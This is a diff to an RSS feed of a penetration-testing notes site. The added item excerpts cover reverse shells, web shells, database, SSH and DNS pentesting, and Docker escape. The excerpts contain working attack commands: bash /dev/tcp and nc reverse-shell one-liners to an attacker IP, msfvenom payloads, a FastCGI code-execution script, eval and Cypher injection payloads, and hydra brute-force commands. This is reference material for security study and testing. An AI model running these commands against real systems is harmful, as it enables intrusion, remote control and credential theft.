@@ -6,8 +6,22 @@
     <description>Recent content in Privilege Escalation on D0CUM3NTN4T10N</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en</language>
-    <lastBuildDate>Thu, 14 Dec 2023 00:00:00 +0000</lastBuildDate>
+    <lastBuildDate>Sat, 23 Dec 2023 00:00:00 +0000</lastBuildDate>
     <atom:link href="https://documentnation.github.io/tags/privilege-escalation/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Reverse Shell with Pwncat</title>
+      <link>https://documentnation.github.io/docs/hdks/shell/reverse-shell-with-pwncat/</link>
+      <pubDate>Sat, 23 Dec 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/shell/reverse-shell-with-pwncat/</guid>
+      <description>It can be downloaded from here.&#xA;For listening from remote connection, run the following command.&#xA;pwncat-cs -lp 4444 # For Windows target pwncat-cs -m windows -lp 4444 Commands linkAfter reverse connecting, we can execute commands either local or remote.&#xA;# Switch between Local and Remote shell Ctrl&amp;#43;D # Upload a file to target machine (e.g. upload example.txt from local to remote) (local) upload ./example.txt /tmp/example.txt </description>
+    </item>
+    <item>
+      <title>Reverse Shell Cheat Sheet</title>
+      <link>https://documentnation.github.io/docs/hdks/shell/reverse-shell-cheat-sheet/</link>
+      <pubDate>Thu, 14 Dec 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/shell/reverse-shell-cheat-sheet/</guid>
+      <description>Setup Listener linkFirst of all, we need to start a listener in local machine to get an incoming connection.&#xA;nc -lvnp 4444 # For more elegant shell, use `rlwrap`. # https://github.com/hanslub42/rlwrap rlwrap nc -lvnp 4444 Online Generator link Reverse Shell Generator Bash link bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1 bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1&amp;#39; /bin/bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1&amp;#39; # For URL param /?q=bash&amp;#43;-i&amp;#43;&amp;gt;%26&amp;#43;/dev/tcp/10.0.0.1/4444&amp;#43;0&amp;gt;%261 /?q=`bash&amp;#43;-c&amp;#43;&amp;#39;bash&amp;#43;-i&amp;#43;&amp;gt;%26&amp;#43;/dev/tcp/10.0.0.1/4444&amp;#43;0&amp;gt;%261&amp;#39;` with Base64 linkExecute the following commands in target machine.</description>
+    </item>
     <item>
       <title>Shadow Credentials</title>
       <link>https://documentnation.github.io/docs/hdks/windows/active-directory/shadow-credentials/</link>
@@ -30,6 +44,27 @@
       <description>Investigation linkFirst check if the current user has SeBackupPrivilege in the privilege information.&#xA;whoami /all If so, we can read arbitrary files on the system include administrator&amp;rsquo;s files, SAML file, SYSTEM registry file, etc.&#xA;Exploitation (Read Sensitive Files) link1. Download &amp;amp; Upload Malicious DLLs linkIn local machine, download malicious dlls from here&#xA;# If powershell, Invoke-WebRequest -Uri http://10.0.0.1:8000/SeBackupPrivilegeUtils.dll -OutFile .\SeBackupPrivilegeUtils.dll Invoke-WebRequest -Uri http://10.0.0.1:8000/SeBackupPrivilegeCmdLets.dll -OutFile .\SeBackupPrivilegeCmdLets.dll # If winrm, upload SeBackupPrivilegeUtils.dll upload SeBackupPrivilegeCmdLets.</description>
     </item>
     <item>
+      <title>MySQL Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/database/mysql-pentesting/</link>
+      <pubDate>Tue, 21 Nov 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/database/mysql-pentesting/</guid>
+      <description>Enumeration link nmap --script mysql-info -p 3306 &amp;lt;target-ip&amp;gt; nmap --script mysql-enum -p 3306 &amp;lt;target-ip&amp;gt; nmap --script mysql-brute -p 3306 &amp;lt;target-ip&amp;gt; nmap --script mysql-databases -p 3306 &amp;lt;target-ip&amp;gt; nmap --script mysql-users -p 3306 &amp;lt;target-ip&amp;gt; nmap --script mysql-* -p 3306 &amp;lt;target-ip&amp;gt; Brute Force Credentials link hydra -l username -P passwords.txt &amp;lt;target-ip&amp;gt; mysql hydra -L usernames.txt -p password &amp;lt;target-ip&amp;gt; mysql Configuration Files link cat /etc/mysql/my.cnf cat /etc/mysql/mysql.conf.d/mysqld.cnf Connect linkmysql command can be replaced with mariadb .</description>
+    </item>
+    <item>
+      <title>Web Reverse Shell</title>
+      <link>https://documentnation.github.io/docs/hdks/shell/web-reverse-shell/</link>
+      <pubDate>Tue, 21 Nov 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/shell/web-reverse-shell/</guid>
+      <description>PHP Reverse Shell (Linux) link # From local script (it&amp;#39;s stored by default in Kali or Parrot) cp /usr/share/webshell/php/php-reverse-shell.php ./shell.php # From repo (https://github.com/pentestmonkey/php-reverse-shell) wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O shell.php # From repo (https://github.com/flozz/p0wny-shell) wget https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php -O shell.php Replace the $ip and the $port in the script with your local ip and port.&#xA;Without fsockopen, and for FreeBSD link &amp;lt;?php set_time_limit (0); $ip = &amp;#39;10.0.0.1&amp;#39;; // CHANGE THIS $port = 4444; // CHANGE THIS // Spawn shell process $descriptorspec = array( 0 =&amp;gt; array(&amp;#34;pipe&amp;#34;, &amp;#34;r&amp;#34;), // stdin is a pipe that the child will read from 1 =&amp;gt; array(&amp;#34;pipe&amp;#34;, &amp;#34;w&amp;#34;), // stdout is a pipe that the child will write to 2 =&amp;gt; array(&amp;#34;file&amp;#34;, &amp;#34;/tmp/error-output.</description>
+    </item>
+    <item>
+      <title>Reverse Shell with Metasploit</title>
+      <link>https://documentnation.github.io/docs/hdks/shell/reverse-shell-with-metasploit/</link>
+      <pubDate>Sat, 11 Nov 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/shell/reverse-shell-with-metasploit/</guid>
+      <description>Generate Reverse Shell Payload link1. Create a Payload using MsfVenom link # Linux msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf &amp;gt; shell.elf # Windows msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f aspx -o shell.aspx 2. Start Listener using MsfConsole link msfconsole msf&amp;gt; use exploit/multi/handler # Linux msf&amp;gt; set payload linux/x86/meterpreter/reverse_tcp # Windows msf&amp;gt; set payload windows/meterpreter/reverse_tcp # or msf&amp;gt; set payload windows/x64/meterpreter/reverse_tcp msf&amp;gt; set lhost 10.</description>
+    </item>
+    <item>
       <title>Windows PrivEsc with AD CS</title>
       <link>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-adcs/</link>
       <pubDate>Sat, 11 Nov 2023 00:00:00 +0000</pubDate>
@@ -44,11 +79,25 @@
       <description>Exploit linkReference: RemotePotato0&#xA;According to the RemotePotato0&amp;rsquo;s README, it abuses the DCOM activation service and trigger an NTLM authentication of any user currently logged on in the target machine. It is required that a privileged user is logged on the same machine (e.g. a Domain Admin user).&#xA;We can download the executable from https://github.com/antonioCoco/RemotePotato0.&#xA;Module 0 (-m 0: Rpc2Http cross protocol relay server + potato trigger) link # In attack machine sudo socat tcp-listen:135,fork,reuseaddr tcp:&amp;lt;target-ip&amp;gt;:9999 &amp;amp; sudo ntlmrelayx.</description>
     </item>
     <item>
+      <title>Docker Escape</title>
+      <link>https://documentnation.github.io/docs/hdks/container/docker/docker-escape/</link>
+      <pubDate>Fri, 03 Nov 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/container/docker/docker-escape/</guid>
+      <description>Investigation linkIf we are in the docker container, we first need to investigate basic information about the container.&#xA;# Environment variables env # Command path echo $PATH ls -al /usr/local/bin ls -al /usr/local/sbin ls -al /usr/bin ls -al /bin # Bash history cat /root/.bash_history cat /home/&amp;lt;username&amp;gt;/.bash_history # Interesting Directories ls -al /etc ls -al /mnt ls -al /opt ls -al /srv ls -al /var/www ls -al /tmp ls -al /dev/shm # Cron cat /etc/cron* crontab -l # Process ps aux ps aux | cat # https://github.</description>
+    </item>
+    <item>
       <title>Kerberos Pentesting</title>
       <link>https://documentnation.github.io/docs/hdks/windows/active-directory/kerberos-pentesting/</link>
       <pubDate>Mon, 30 Oct 2023 00:00:00 +0000</pubDate>
       <guid>https://documentnation.github.io/docs/hdks/windows/active-directory/kerberos-pentesting/</guid>
       <description>Enumeration linkTo enumerate automatically, you can use nmap.&#xA;nmap --script krb5-enum-users --script-args krb5-enum-users.realm=&amp;#39;example.local&amp;#39;-p 88 &amp;lt;target-ip&amp;gt; Brute Force Authentication linkKerbrute is a tool to perform Kerberos pre-auth bruteforcing.&#xA;The wordlist (e.g. combos.txt) specified must be the &amp;ldquo;username:password&amp;rdquo; combinations.&#xA;# -v: verbose mode *it&amp;#39;s recommended to add this flag otherwise we cannot confirm if the user exist or not. # --dc: domain controller # -d: domain # combos.txt: the wordlist specified must be combinations with &amp;#34;username:password&amp;#34;.</description>
+    </item>
+    <item>
+      <title>SSH (Secure Shell) Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/network/protocol/ssh-pentesting/</link>
+      <pubDate>Mon, 30 Oct 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/network/protocol/ssh-pentesting/</guid>
+      <description>Enumeration link nmap --script ssh-brute -p 22 &amp;lt;target-ip&amp;gt; nmap --script ssh-auth-methods --script-args=&amp;#34;ssh.user=username&amp;#34; -p 22 &amp;lt;target-ip&amp;gt; nmap --script ssh-* -p 22 &amp;lt;target-ip&amp;gt; # User enumeration msfconsole msf&amp;gt; use auxiliary/scanner/ssh/ssh_enumusers Brute Force Credentials link # -t: tasks hydra -l username -P passwords.txt &amp;lt;target-ip&amp;gt; ssh -t 4 hydra -L usernames.txt -p password &amp;lt;target-ip&amp;gt; ssh -t 4 # Specific ports hydra -l username -P passwords.txt -s 2222 &amp;lt;target-ip&amp;gt; ssh -t 4 hydra -l username -P passwords.</description>
     </item>
     <item>
       <title>Sudo Privilege Escalation by Overriding Shared Library</title>
@@ -70,6 +119,13 @@
       <pubDate>Sun, 22 Oct 2023 00:00:00 +0000</pubDate>
       <guid>https://documentnation.github.io/docs/hdks/windows/active-directory/ad-cs-pentesting/</guid>
       <description>Enumeration linkWe can retrieve certificates information on target Windows machine using certutil.&#xA;# Dump general information certutil -dump # Dump information about certificate authority certutil -ca certutil -catemplates # List all templates certutil -template # specify the template certutil -template ExampleTemplate Then check if Allow Full Control or Allow Write include the group which current user belongs to. If so, we can modify the template and might be able to escalate privilege.</description>
+    </item>
+    <item>
+      <title>DNS (Domain Name Systems) Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/dns/dns-pentesting/</link>
+      <pubDate>Sun, 22 Oct 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/dns/dns-pentesting/</guid>
+      <description>Enumeration linkYou can use Nmap to enumerate automatically.&#xA;nmap --script dns-nsec-enum --script-args dns-nsec-enum.domains vulnerable.com -p 53 &amp;lt;target-ip&amp;gt; nmap --script dns-random-srcport -p 53 &amp;lt;target-ip&amp;gt; nmap --script dns-recursion -p 53 &amp;lt;target-ip&amp;gt; nmap --script dns-service-discovery -p 53 &amp;lt;target-ip&amp;gt; nmap --script dns-* -p 53 &amp;lt;target-ip&amp;gt; nmap -n --script &amp;#34;(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport&amp;#34; &amp;lt;target-ip&amp;gt; Investigation linkDNSdumpster is an online tool for reconnaissance DNS records.&#xA;IP Address from the Domain link host example.</description>
     </item>
     <item>
       <title>Windows PrivEsc with Kerberos</title>
@@ -135,6 +191,20 @@
       <description>Command Execution linkThe script file of gnuplot can be used to execute system commands as below.&#xA;gnuplot test.plt Contents of the .plt is like the following.&#xA;system &amp;#34;whoami&amp;#34; # Reverse shell system &amp;#34;bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1&amp;#39;&amp;#34; </description>
     </item>
     <item>
+      <title>Moby Docker Engine PrivEsc</title>
+      <link>https://documentnation.github.io/docs/hdks/container/docker/moby-docker-engine-privesc/</link>
+      <pubDate>Tue, 02 May 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/container/docker/moby-docker-engine-privesc/</guid>
+      <description>Directory Traversal &amp;amp; Arbitrary Command Execution (CVE-2021-41091 ) link1. Find Docker Container Directory linkFirst off, find the directory which the docker container mounted&#xA;findmnt # Results e.g. /var/lib/docker/overlay2/abcdef...xyz/merged Assume the directory above found, we can investigate in the directory.&#xA;ls -la /var/lib/docker/overlay2/abcdef...xyz/merged/ 2. Prepare SUID Binary in Container linkIf we can be root in the docker container, set uid arbitrary binary as below. Please note that we need to do that in the container, not the real host.</description>
+    </item>
+    <item>
+      <title>Neo4j Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/database/neo4j-pentesting/</link>
+      <pubDate>Thu, 27 Apr 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/database/neo4j-pentesting/</guid>
+      <description>Default Credentials link neo4j:neo4j Common Directories &amp;amp; Files in Local System link /var/lib/neo4j /var/log/neo4j Cypher Injection linkBefore injecting payloads, we need to start local web server to fetch the result of the query.&#xA;sudo python3 -m http.server 80 Below are payloads.&#xA;In some payloads, replace 10.0.0.1 with your ip address.&#xA;&amp;lt;!-- Get Neo4j version --&amp;gt; &amp;#39; OR 1=1 WITH 1 as a CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM &amp;#39;http://10.</description>
+    </item>
+    <item>
       <title>Pip Download Code Execution</title>
       <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/pip-download-code-execution/</link>
       <pubDate>Thu, 27 Apr 2023 00:00:00 +0000</pubDate>
@@ -168,6 +238,20 @@
       <pubDate>Tue, 11 Apr 2023 00:00:00 +0000</pubDate>
       <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/python-eval-code-execution/</guid>
       <description>Investigation link eval(text) eval(f&amp;#34;5 &amp;#43; {num}&amp;#34;) If the Python script allows us to input some value to the &amp;ldquo;text&amp;rdquo; variable, we can inject arbitrary code.&#xA;Arbitrary Code Execution linkMost of the time, we need to bypass another expression to execute our desired command.&#xA;__import__(&amp;#39;os&amp;#39;).system(&amp;#39;id&amp;#39;) &amp;lt;!-- Bypass another expression in eval --&amp;gt; ),__import__(&amp;#39;os&amp;#39;).system(&amp;#39;id&amp;#39;) &amp;#39;),__import__(&amp;#39;os&amp;#39;).system(&amp;#39;id&amp;#39;) },__import__(&amp;#39;os&amp;#39;).system(&amp;#39;id&amp;#39;) ),__import__(&amp;#39;os&amp;#39;).system(&amp;#39;id&amp;#39;)# Reverse Shell link __import__(&amp;#39;os&amp;#39;).system(&amp;#39;bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1&amp;#34;&amp;#39;) </description>
+    </item>
+    <item>
+      <title>FastCGI Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/network/fastcgi-pentesting/</link>
+      <pubDate>Mon, 10 Apr 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/network/fastcgi-pentesting/</guid>
+      <description>Investigation linkIf the PHP-FPM (FastCGI Process Manager) is running on the target system, we might be able to execute arbitrary command.&#xA;ps aux | cat php-fpm: pool username Remote Code Execution linkReference: https://book.hacktricks.xyz/network-services-pentesting/9000-pentesting-fastcgi&#xA;We need to create an arbitrary PHP file somewhere. For instance,&#xA;touch /dev/shm/index.php Then create a shell script named &amp;ldquo;exploit.sh&amp;rdquo;.&#xA;#!/bin/bash PAYLOAD=&amp;#34;&amp;lt;?php echo &amp;#39;&amp;lt;!--&amp;#39;; system(&amp;#39;rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.0.0.1 4444 &amp;gt;/tmp/f&amp;#39;); echo &amp;#39;--&amp;gt;&amp;#39;;&amp;#34; FILENAMES=&amp;#34;/dev/shm/index.php&amp;#34; # Exisiting file path HOST=$1 B64=$(echo &amp;#34;$PAYLOAD&amp;#34;|base64) for FN in $FILENAMES; do OUTPUT=$(mktemp) env -i \ PHP_VALUE=&amp;#34;allow_url_include=1&amp;#34;$&amp;#39;\n&amp;#39;&amp;#34;allow_url_fopen=1&amp;#34;$&amp;#39;\n&amp;#39;&amp;#34;auto_prepend_file=&amp;#39;data://text/plain\;base64,$B64&amp;#39;&amp;#34; \ SCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST \ cgi-fcgi -bind -connect $HOST:9000 &amp;amp;&amp;gt; $OUTPUT cat $OUTPUT done Now execute the shell script.</description>
+    </item>
+    <item>
+      <title>Upgrade to Fully Interactive TTY</title>
+      <link>https://documentnation.github.io/docs/hdks/shell/upgrade-to-fully-interactive-tty/</link>
+      <pubDate>Sat, 08 Apr 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/shell/upgrade-to-fully-interactive-tty/</guid>
+      <description>Upgrade linkAfter connecting to the target shell with reverse shell, it&amp;rsquo;s recommended to make the shell to be more elegant.&#xA;python3 -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; # or python -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; # or python2 -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; # or SHELL=/bin/bash script -q /dev/null The commands below make our shell even more perfect.&#xA;Ctrl&amp;#43;z stty raw -echo;fg Enter x2 export TERM=xterm </description>
     </item>
     <item>
       <title>Tar Wildcard Injection PrivEsc</title>
@@ -427,6 +511,13 @@
       <pubDate>Mon, 30 Jan 2023 00:00:00 +0000</pubDate>
       <guid>https://documentnation.github.io/docs/hdks/linux/container/lxc-lxd-privilege-escalation/</guid>
       <description>Basic Flow link Check if You are in the Lxd Group&#xA;If you belong to the Lxd group, you may be able to the root privileges.&#xA;groups id Check if Container Image Exists&#xA;List all images and check if a container image already exists.&#xA;lxc image list If there are not container, build a new image in your local machine.&#xA;git clone https://github.com/saghul/lxd-alpine-builder.git cd lxd-alpine-builder sudo ./build-alpine python3 -m http.server 8000 In remote machine, download the “alpine-*.</description>
+    </item>
+    <item>
+      <title>MicroK8s Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/container/kubernetes/microk8s-pentesting/</link>
+      <pubDate>Sat, 28 Jan 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/container/kubernetes/microk8s-pentesting/</guid>
+      <description>Ports and Services link Port 10250 - kubelet Port 10255 - kubelet (read only) Port 10257 - kube-controller Port 10259 - kube-scheduler Port 16443 - API server Port 25000 - cluster-agent Port 32000 - Docker registry Docker Registry (port 32000) linkIt is the same as Docker Registry Pentesting .&#xA;Investigation from Inside link # Version snap info microk8s Privilege Escalation (CVE-2019-15789) ≤ 1.15.2 linkSee the post for details.&#xA;1. Create a Pod Yaml File linkReplace the value of spec.</description>
     </item>
     <item>
       <title>LAPS (Local Administrator Password Solution) Pentesting</title>
